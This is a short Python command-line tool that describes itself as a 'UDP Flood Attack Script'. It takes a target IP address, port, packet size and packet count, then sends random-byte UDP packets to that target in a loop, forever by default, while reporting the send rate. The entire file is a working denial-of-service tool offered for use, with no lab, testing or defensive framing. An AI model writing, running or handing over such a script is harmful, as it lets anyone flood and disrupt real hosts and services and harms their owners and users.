import socket
import random
import time
import argparse

def main():
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("-n", "--packets", type=int, default=0, help="Number of packets to send (0 for infinite)")
    parser.add_argument("-i", "--interval", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")
    args = parser.parse_args()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as e:
        print(f"Socket creation failed: {e}")
        return
    
    bytes_to_send = random._urandom(args.size)
    target = (args.target, args.port)
    
    print(f"Starting UDP flood attack on {args.target}:{args.port}...")
    print("Press Ctrl+C to stop the attack")
    
    packets_sent = 0
    start_time = time.time()
    
    try:
        while args.packets == 0 or packets_sent < args.packets:
            sock.sendto(bytes_to_send, target)
            packets_sent += 1
            
            if packets_sent % 1000 == 0:
                elapsed = time.time() - start_time
                rate = packets_sent / elapsed if elapsed > 0 else 0
                print(f"Sent {packets_sent} packets ({rate:.2f} packets/sec)")
            
            time.sleep(args.interval)
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        rate = packets_sent / elapsed if elapsed > 0 else 0
        print(f"\nAttack stopped. Sent {packets_sent} packets in {elapsed:.2f} seconds ({rate:.2f} packets/sec)")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
